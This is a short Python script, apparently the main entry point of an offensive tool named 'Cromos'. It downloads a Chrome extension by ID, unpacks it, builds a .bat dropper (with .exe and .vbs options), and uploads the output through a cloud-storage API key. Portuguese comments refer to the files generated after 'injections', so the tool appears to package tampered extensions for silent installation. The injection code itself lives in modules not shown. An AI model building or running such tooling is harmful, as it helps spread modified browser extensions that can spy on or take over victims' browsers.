#!/usr/bin/python

import argparse
from pyfiglet import Figlet
import sys
from libs.crx import CRX
from libs.drive import Drive
from libs.build import Build


def Flag() : 
	Cromos = Figlet(font='slant')
	print("%s" % (Cromos.renderText('Cromos')))


def optionsParser () :

	global extension, build, apikey, output

	parser = argparse.ArgumentParser(usage="python cromos.py --help")
	parser.add_argument('--extension', help="Download a CRX from Google Chrome Webstore", type=str, default="", required=True)
	parser.add_argument('--build', help='Builds types .bat\n.exe\n.vbs', type=str, default="")
	parser.add_argument('--key', help='API key for uploading files in dropbox', type=str, default="")
	parser.add_argument('--output', help='Output folder for compiled files', type=str, default="")

	args = parser.parse_args()

	extension = args.extension # Extensao ID
	build = args.build # Tipo do arquivo que devera ser gerado apos os injections
	apikey = args.key # API key par ao dropbox
	output = args.output # Pasta de saida para os arquivos

	if len(sys.argv) <= 2 :
		parser.print_help()
		

if __name__== "__main__" :

	Flag()
	optionsParser()

	CRXInjection = CRX(extension)
	
	if CRXInjection.Valid(CRXInjection.extension):

		print("Download the CRX {} ...".format(extension))
		CRXInjection.Download(extension)
		print("Unpacking the CRX {} ...".format(extension))
		CRXInjection.Unpack(extension)
		print("Extract the zip file {} ...".format(extension))
		CRXInjection.Extract(extension)
		print("Extension directory output/extension/{}".format(extension))
		print("Creating .bat file in output/builds/{}.bat ...".format(extension))
		build = Build(extension)
		build.Builder()

		

		print("Connecting to google Drive API ...")

		dropbox = Drive(extension, apikey)